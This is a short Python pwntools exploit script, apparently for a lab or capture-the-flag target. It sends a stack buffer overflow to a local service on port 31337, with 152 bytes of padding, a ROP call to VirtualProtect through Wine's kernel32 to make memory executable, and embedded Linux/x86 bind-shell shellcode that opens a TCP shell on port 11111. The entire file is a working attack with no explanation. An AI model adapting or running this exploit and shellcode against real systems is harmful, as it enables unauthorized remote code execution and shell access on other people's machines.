from pwn import *

# 836   Linux/x86   Tiny Shell Bind TCP - 73 bytes
# Written in 2013 by Geyslan G. Bem, Hacking bits
# http://shell-storm.org/shellcode/files/shellcode-836.php
# Opens tcp shell at port 11111
shellcode = ""
shellcode += "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
shellcode += "\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
shellcode += "\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
shellcode += "\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
shellcode += "\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
shellcode += "\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
shellcode += "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
shellcode += "\x41\xcd\x80"

# might need some adjustment depending on your system
shellcode_ptr = 0x33fcd0

# Address via readelf -s /usr/lib/i386-linux-gnu/wine/kernel32.dll.so |grep VirtualProtect
# Update it if your kernel32.dll.so is different from
VirtualProtect_ptr = 0x7b480a00     		

# parameters to VirtualProtect
lpAddress       = shellcode_ptr & 0xfffff000    # expexted address of shell
dwSize          = 4096                          # should cover our shellcod
flNewProtect    = 0x40                          # PAGE_EXECUTE_READWRITE
lpflOldProtect  = shellcode_ptr-100             # some writable address

exploitstr = "A"*152

# offset in exploitstr 152
# ROP-call to VirtualProtect
exploitstr += p32(VirtualProtect_ptr)

exploitstr += p32(shellcode_ptr)     # return to shellcode
# params to VirtualProtect
exploitstr += p32(lpAddress)
exploitstr += p32(dwSize)
exploitstr += p32(flNewProtect)
exploitstr += p32(lpflOldProtect)

exploitstr += "\x90"*4+shellcode

c = connect("127.0.0.1",31337)
c.send(exploitstr)
